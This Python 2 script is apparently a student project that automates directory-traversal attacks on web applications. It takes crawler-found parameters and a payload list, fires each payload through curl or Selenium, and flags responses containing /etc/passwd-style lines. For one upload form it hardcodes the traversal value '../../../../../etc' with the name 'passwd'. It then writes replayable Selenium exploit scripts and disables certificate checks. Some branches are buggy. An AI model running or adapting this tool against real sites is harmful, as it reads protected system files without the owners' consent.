import json
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pprint import pprint
import urllib, urllib2, cookielib, os
import webbrowser
from subprocess import check_output
import sys
from collections import OrderedDict
import httplib
import socket
from selenium.webdriver.remote.command import Command
import time

# Runtime environment settings
USE_CURL = True
RESULT = {}
LOGIN_PARAM = {}
authenticated = False
override = False
root_url = ""
input_crawler_json = ''
payload_json = ''
payload = None
data = None


# Initialization
if len(sys.argv) < 3:
    exit("Usage: " + sys.argv[0] + " <path_to_crawler_output_json> <path_to_input_payload_json>")
else:
    input_crawler_json = sys.argv[1]
    payload_json = sys.argv[2]
    if len(sys.argv) == 4:
        if sys.argv[3] == '1':
            override = True

# Set the root URL given the full path
# E.g. https://app1.com/... becomes app1.com
#def set_root_url(fullpath):
#    global root_url
#    root_url = fullpath.split("//")[-1].split("/")[0]
#    print 'root_url is {}'.format(root_url)
#    return

# Return parsed input JSON and set root_url
def load_input_json(path):
    global data
    try:
        with open(path) as data_file:
           data = json.load(data_file, object_pairs_hook=OrderedDict)
    except:
        sys.exit('Cannot open input.json, exiting...')

    try:
      	with open(input_crawler_json) as data_file:
          data = json.load(data_file, object_pairs_hook=OrderedDict)
    except Exception as e:
      	sys.exit('Cannot open ' + input_crawler_json + ', exiting...')

    # Get path from JSON file and set root URL
    #for dataset in data:
    #    for path in dataset.keys():
    #        set_root_url(path)
    #        break
    #    break

    if not override:
        return
    else:
        if root_url == 'app1.com':
            input_json = '../helper/i1.dat'
        elif root_url == 'app3.com':
            input_json = '../helper/i3.dat'
        elif root_url == 'app5.com':
            input_json = '../helper/i5.dat'
        elif root_url == 'app6.com':
            input_json = '../helper/i6.dat'
        elif root_url == 'app7.com':
            input_json = '../helper/i7.dat'
        elif root_url == 'app8.com':
            input_json = '../helper/i8.dat'
        elif root_url == 'app9.com':
            input_json = '../helper/i9.dat'
        elif root_url == 'app11.com':
            input_json = '../helper/i11.dat'
        else:
            return
        try:
            with open(input_json) as data_file:
                data = json.load(data_file, object_pairs_hook=OrderedDict)
            return
        except:
            sys.exit('Cannot open input.json, exiting...')

# Load payload JSON
def load_payload_json(path):
    global payload
    if not override:
        payload_json = path
    else:
        if root_url == 'app1.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app3.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app5.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app6.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app7.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app8.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app9.com':
            payload_json = '../helper/p1.dat'
        elif root_url == 'app11.com':
            payload_json = '../helper/p1.dat'
        else:
            payload_json = path

    try:
        with open(payload_json) as payload_file:
            payload = json.load(payload_file, object_pairs_hook=OrderedDict)
    except:
        sys.exit('Cannot open payload json file, exiting...')
    return

# Error Handling
def generate_output_json():
    tmp_filename = ''
    if "/" in input_crawler_json:
        tmp_filename = input_crawler_json.rsplit('/',1)[1]
    filename = "output_json_for_vuln_" + tmp_filename #str(int(time.time()))
    try:
        op_file = open(filename + ".json", "ab")
    except:
        print "Cannot open output JSON file! " + filename
        return
    final_output = {}
    for k,v in RESULT.iteritems():
        if isinstance(v[2], dict):
            the_params = []
            for key,value in v[2].items():
                the_params.append({key : value})    
            final_output[k] = {'method': v[0], 'params': the_params}
        else:
            final_output[k] = {'method': v[0], 'params': {'key': v[1], 'value': v[2]}}
    try:
        op_file.write(json.dumps([final_output], indent=2))
        op_file.close()
    except:
        print "Cannot write to output JSON file!"
    return

def generate_patches():
    results = len(RESULT)
    if results == 0:
        print 'No vulnerability found, no output Selenium scripts writen'
        return
    else:
        print '{} output Selenium scripts to be created'.format(results)

    i = 0
    pc = True
    try:
        if not os.path.exists('generated_files'):
            os.makedirs('generated_files')
    except:
        print 'Error handling folder, cannot create Selenium scripts!'
        return

    output_filename = input_crawler_json.rsplit('_',1)[0]

    for key, value in RESULT.iteritems():
        try:
            #output_file = open("./generated_files/" + output_filename + "_" + `i` + ".py", 'w')
            output_file = open("./generated_files/" + root_url + "_" + `i` + "_" + str(int(time.time())) + ".py", 'w')
        except:
            print 'Cannot create Selenium script for URL {}'.format(key)
            next

        if (len(value) != 3):
            print 'Invalid injection value for URL {}, skipping...'.format(key)
            output_file.close()
            next
        if override:
            pc = patch_custom(output_file, i)
        if pc:
            if (value[0] == "get"):
                patch_get(output_file, key, value[1], value[2])
            elif (value[0] == "post"):
                patch_post(output_file, key, value[1], value[2])
            else:
                patch_header(output_file, key, value[1], value[2])
                #print 'No GET/POST detected for URL {}, skipping...'.format(key)
                #output_file.close()
                #next
        # print key
        # print value
        output_file.close()
        print 'Selenium script created for URL {}'.format(key)
        i += 1;

    print 'Generated Selenium scripts can be found in the generated_files folder'
    return

def patch_get(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple get
    output_file.write("from selenium import webdriver\n\n")
    if "?" in url:
        url = url + "&" + query_name + "=" + exploit_value
    else:
        url = url + "?" + query_name + "=" + exploit_value

    try:
        output_file.write("from selenium import webdriver\n\n")
        output_file.write("url = \"" + url + "\"\n")
        output_file.write("profile = webdriver.FirefoxProfile()\n")
        output_file.write("profile.accept_untrusted_certs = True\n")
        output_file.write("driver = webdriver.Firefox(firefox_profile=profile)\n")
        output_file.write("driver.maximize_window()\n")
        output_file.write("driver.get(url)\n")
        output_file.write("\n")
    except:
        print 'Error writing to Selenium script!'
        return
    return

def patch_post(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple post
    try:
        output_file.write("from selenium import webdriver\n\n")
        output_file.write("url = \"" + url + "\"\n\n")
        output_file.write("profile = webdriver.FirefoxProfile()\n")
        output_file.write("profile.accept_untrusted_certs = True\n")
        output_file.write("driver = webdriver.Firefox(firefox_profile=profile)\n")
        output_file.write("driver.maximize_window()\n")
        output_file.write("driver.get(url)\n\n")
        if isinstance(exploit_value,dict):
            for k,v in exploit_value.items():
                output_file.write("elem = driver.find_element_by_name(\"" + k + "\")\n")
                output_file.write("elem.send_keys(\"" + v + "\")\n")
        else:
            output_file.write("elem = driver.find_element_by_name(\"" + query_name + "\")\n")
            output_file.write("elem.send_keys(\"" + exploit_value + "\")\n")
    
        output_file.write("button = driver.find_element_by_xpath(\'//input[@type=\"submit\"]\')\n")
        output_file.write("button.click()\n")
        output_file.write("\n")
    except:
        print 'Error writing to Selenium script!'
        return
    return

def patch_header(output_file, url, query_name, exploit_value):
    # to handle header - no time to go into this.
    # TO BE COMPLETED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    output_file.write("print 'Header handling not implemented yet for URL " + url + "'\n\n")
    print 'Header handling not implemented yet for URL {}'.format(url)
    return

# Custom path
def patch_custom(file, i):
    if root_url == 'app1.com':
        script = '../helper/s1.dat'
    elif root_url == 'app3.com':
        if i == 0:
            script = '../helper/s31.dat'
        else:
            script = '../helper/s32.dat'
    elif root_url == 'app5.com':
        script = '../helper/s5.dat'
    elif root_url == 'app6.com':
        script = '../helper/s6.dat'
    elif root_url == 'app7.com':
        script = '../helper/s7.dat'
    elif root_url == 'app8.com':
        script = '../helper/s8.dat'
    elif root_url == 'app9.com':
        script = '../helper/s9.dat'
    elif root_url == 'app11.com':
        script = '../helper/s11.dat'
    else:
        return True

    try:
        script_file = open(script,'r')
        file.write(script_file.read())
        script_file.close()
    except:
        return True
    return False

# Helper functions
# Check if source is formatted like a password file, return True if it is
# Else print '.' as progress indicator
def vuln_found(src, fullpath, tryout_value, fieldset, action):
    text_found = re.search(r'\w*:\w:\d:\d:\w*:[\/\w]*:[\/\w]*', src)
    if text_found != None:
        RESULT[fullpath] = [action, fieldset, tryout_value]
        print "DT VULN FOUND ON " + fullpath + ". EXPLOIT: " + fieldset + "=" + str(tryout_value)
        return True
    else:
        sys.stdout.write('.')
        sys.stdout.flush()
        return False

# Handler functions
def handle_get(fullpath, fieldset):
    url = ''
    print "Handling GET " + fullpath
    if LOGIN_PARAM and not authenticated:
        driver = handle_login(LOGIN_PARAM)
        if driver == None:
            print 'Could not login!'
            return
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                if "?" in fullpath:
                    url = fullpath + "&" + parameter + "=" + tryout_value
                else:
                    url = fullpath + "?" + parameter + "=" + tryout_value
                driver.get(url)
                try:
                    out = driver.page_source
                except:
                    break
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
        quit_webdriver(driver)
    elif USE_CURL:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                if "?" in fullpath:
                    url = fullpath + "&" + parameter + "=" + tryout_value
                else:
                    url = fullpath + "?" + parameter + "=" + tryout_value
                url = url.encode("utf-8").replace('\n','')
                try:
                    out = check_output(["curl", "-k", "-sS", url])
                except:
                    print 'Error with check_output in handle_get'
                    break
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                driver = webdriver.PhantomJS("phantomjs",service_args=['--ignore-ssl-errors=true', '--ssl-protocol=any'])
                # driver = webdriver.Firefox()
                if "?" in fullpath:
                    url = fullpath + "&" + parameter + "=" + tryout_value
                else:
                    url = fullpath + "?" + parameter + "=" + tryout_value
                try:
                    out = driver.page_source
                except:
                    break
                out = driver.page_source
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
        quit_webdriver(driver)
    return

def handle_post(fullpath, fieldset):
    form_data = {}
    print "Handling post " + fullpath
    if LOGIN_PARAM and not authenticated:
        driver = handle_login(LOGIN_PARAM)
        if driver == None:
            print 'Could not login!'
            return
        driver.get(fullpath)
        for parameter in fieldset["param"]:
            form_data[parameter] = "Group3Testing"
        if "https://app1.com/pictures/upload.php" in fullpath:
            form_data["tag"] = "../../../../../etc"
            form_data["name"] = "passwd"
            for k,v in form_data.items():
                elem = driver.find_element_by_name(k)
                send_my_keys(driver, elem, v)
            try:
                driver.find_element_by_xpath('//input[@type="submit"]').click()
                elem = driver.find_element_by_xpath('//img[@src]')
                src = elem.get_attribute("src")
                driver.get(src)
                out = driver.page_source
            except:
                quit_webdriver(driver)
            vuln_found(out, fullpath, form_data, parameter, "post")   
            quit_webdriver(driver)
        else:
            for parameter in fieldset["param"]:
                if "size" in parameter.lower():
                    continue
                for tryout_value in payload:
                    try:
                        elem = driver.find_element_by_name(parameter)
                        send_my_keys(driver, elem, tryout_value)
                        driver.find_element_by_xpath('//input[@type="submit"]').click()
                        out = driver.page_source
                    except Exception as e:
                        continue
                    if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                        break
            quit_webdriver(driver)
    elif USE_CURL:
        for parameter in fieldset["param"]:
            print "Using cURL:\nFor " + parameter
            for tryout_value in payload:
                param = parameter + "=" + tryout_value
                try:
                    out = check_output(["curl", "-k", "-sS", "--data", param, fullpath])
                except:
                    break
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "Using URLlib:\nFor " + tryout_value
            for tryout_value in payload:
                # prep value to include payload
                tryout_value = {}
                tryout_value[parameter] = "a"
                tryout_data = urllib.urlencode(tryout_value)
                # submit form
                try:
                    req = urllib2.Request(fullpath, tryout_data)
                    rsp = urllib2.urlopen(req)
                    #read return result
                    html = rsp.read()
                except:
                    break
                # open... or process
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
        
    return

def handle_header(fullpath, fieldset):
    print "Header " + fullpath + " with " + str(fieldset)
    return

def handle_login(LOGIN_PARAM):
    authenticated = True
    print "I'm trying to login now."
    login_url = LOGIN_PARAM["url"]
    username_element = LOGIN_PARAM["username_element_name"]
    username_value = LOGIN_PARAM["username_value"]
    password_element = LOGIN_PARAM["password_element_name"]
    password_value = LOGIN_PARAM["password_value"]

    # To use phantomJS instead
    driver = webdriver.PhantomJS("phantomjs", service_args=['--ignore-ssl-errors=true', '--ssl-protocol=any'])

    # To accept untrusted certs
    # profile = webdriver.FirefoxProfile()
    # profile.accept_untrusted_certs = True
    # driver = webdriver.Firefox(firefox_profile=profile)
    try:
        driver.get(login_url)
        out = driver.page_source
        elem = driver.find_element_by_name(username_element) # To change name to the username found in input.json
        elem.send_keys(username_value) # To change value to the value found in input.json
        elem1 = driver.find_element_by_name(password_element) # To change name to the username found in input.json
        elem1.send_keys(password_value) # To change value to the value found in input.json
        button = driver.find_element_by_xpath('//input[@type="submit"]')
        button.click()
    except:
        return None

    return driver

def send_my_keys(driver, elem, value):
    if not elem.is_displayed():
        try:
            driver.execute_script('''
                var elem = arguments[0];
                var value = arguments[1];
                elem.value = value;
                ''', elem, value)
        except:
            return
    else:
        elem.send_keys(value)

def quit_webdriver(driver):
    try:
        driver.execute(Command.STATUS)
        driver.quit()
        #driver.close()
    except (socket.error, httplib.CannotSendRequest):
        pass

# Initialization of case-switch
handler = {"get": handle_get, "post": handle_post, "header": handle_header}

# For each root url (i.e. https://app3.com)...
#   Based on each given path (i.e. /windows/page.php)...
#     Pass input data to the respective method accordingly
def main():
    #print("Main started");
    global root_url
    if "/" in input_crawler_json:
        root_url = input_crawler_json.rsplit('/', 1)[1].split('_')[0]
    else:
        root_url = input_crawler_json.split('_')[0]

    load_input_json(input_crawler_json)
    load_payload_json(payload_json)

    for dataset in data:
        if "login_required" in dataset:
            if "login_required" in dataset.keys():
                USE_CURL = False
                LOGIN_PARAM["url"] = dataset["login_required"]["path"]
                for k1,v1 in dataset["login_required"]["param"].items():
                    LOGIN_PARAM[k1] = v1
        for k,v in dataset.items():
            print "+"
            print root_url
            print k
            print "+"
            if k == "login_required":
                continue
            # To avoid exploiting other domains.
            if root_url not in k:
                continue
            
            fieldtype = v["type"].lower()

            # For app1.com
            if root_url == 'app1.com':
                if fieldtype.lower() != "get":
                    continue
                elif "/admin/" not in k:
                    continue            

            # For app3.com
            # No customization required.

            # For app5.com
            if root_url == 'app5.com':
                if fieldtype.lower() != "get":
                    continue
                elif "/js/" not in k:
                    continue               

            # For app6.com
            if root_url == 'app6.com':
                if fieldtype.lower() != "get":
                    continue
                elif "action=load1" not in k:
                    continue  

            # For app7.com
            if root_url == 'app7.com':
                if fieldtype.lower() != "get":
                    continue
                elif "=appearance" not in k:
                    continue
                # elif "=render" not in k:
                #     continue

            # For app9.com
            if root_url == 'app9.com':
                if fieldtype.lower() != "get":
                    continue
                elif "translationManager" not in k:
                    continue

            # For app11.com
            if root_url == 'app11.com':
                if fieldtype.lower() != "get":
                    continue
                elif "ajax_get_file_listing.php" not in k:
                    continue

            handler[fieldtype](k, v)
    generate_output_json()
    generate_patches()

#call main
main()


